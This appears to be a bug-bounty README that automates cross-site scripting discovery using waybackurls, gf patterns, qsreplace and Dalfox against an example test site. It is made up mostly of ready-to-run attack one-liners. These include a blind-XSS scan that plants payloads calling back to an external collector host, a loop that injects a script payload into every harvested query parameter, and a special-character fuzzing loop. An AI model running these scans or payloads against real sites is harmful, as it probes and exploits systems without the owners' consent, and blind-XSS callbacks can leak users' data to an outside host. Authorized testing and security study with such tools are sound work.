# Automate XSS using Dalfox, WaybackURL, GF Patterns.

<b> Make sure you have Go installed on your Machine </b> 

### To Install Go on your Machine:

```
  1) sudo apt install -y golang
  2) export GOROOT=/usr/lib/go
  3) export GOPATH=$HOME/go
  4) export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
  5) source .bashrc
```

## How to Hunt Blind XSS using Dalfox? 

- Use Waybackurls by Tomnomnom to Fetch URLS for Specific Target.
- Use GF patterns to find Possible XSS Vulnerable Parameters.
- Use Dalfox to find XSS.

* Steps :
```bash
waybackurls testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt && cat Possible_xss.txt | dalfox -b blindxss.xss.ht pipe > output.txt
```
## How to Hunt Reflected XSS?

- Use Waybackurls by Tomnomnom to Fetch URLS for Specific Target.
- Use qsreplace for Accept URLs on stdin, replace all query string values with a user-supplied value, only output each combination of query string parameters once per host and path.

* Steps :
```bash
waybackurls testphp.vulnweb.com| grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
```
## Find the parameters which are not filtering special characters - One Liner
```bash
echo "test.url" | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|pdf|svg|txt)" | qsreplace '"><()'| tee combinedfuzz.json && cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "\"><()" && echo -e "$host \033[91m Vullnerable \e[0m \n" || echo -e "$host  \033[92m Not Vulnerable \e[0m \n"; done | tee XSS.txt
```

## Tools Download Links:- 

* 1:- [Dalfox](https://github.com/hahwul/dalfox)
* 2:- [Waybackurls](https://github.com/tomnomnom/waybackurls)
* 3:- [GF](https://github.com/tomnomnom/gf)
* 4:- [GF Patterns](https://github.com/1ndianl33t/Gf-Patterns)
* 5:- [qsreplace](https://github.com/tomnomnom/qsreplace)

Find Script here : [QuickXSS](https://github.com/theinfosecguy/QuickXSS)


If you have any Questions, Reach out to me via [Twitter](https://twitter.com/g0t_rOoT_)
## Twitter : [Fani Malik](https://twitter.com/fanimalikhack)
## Twitter : [Faizee Asad](https://twitter.com/faizee_asad)
## Twitter : [Prince Prafull](https://twitter.com/princeprafull3)
